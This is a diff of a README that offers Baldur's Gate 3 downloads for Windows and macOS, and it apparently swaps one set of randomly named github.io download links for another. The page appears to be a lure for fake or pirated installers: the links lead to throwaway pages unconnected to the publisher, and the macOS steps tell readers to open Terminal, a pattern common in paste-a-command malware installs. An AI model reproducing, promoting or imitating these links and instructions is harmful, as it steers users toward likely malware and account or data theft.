@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Baldur%27s%20Gate%203-F9A825?style=for-the-badge&logo=github)](https://nrotnjxfyuta.github.io/win-setup/)
+[![Download](https://img.shields.io/badge/⬇_Download_Baldur%27s%20Gate%203-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
 
 </div>
 
@@ -65,9 +65,9 @@ Baldur’s Gate 3 is a story-rich, party-based RPG set in the universe of Dungeo
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://nrotnjxfyuta.github.io/win-setup/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
 
 </div>
 
@@ -107,7 +107,7 @@ Baldur’s Gate 3 is a story-rich, party-based RPG set in the universe of Dungeo
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
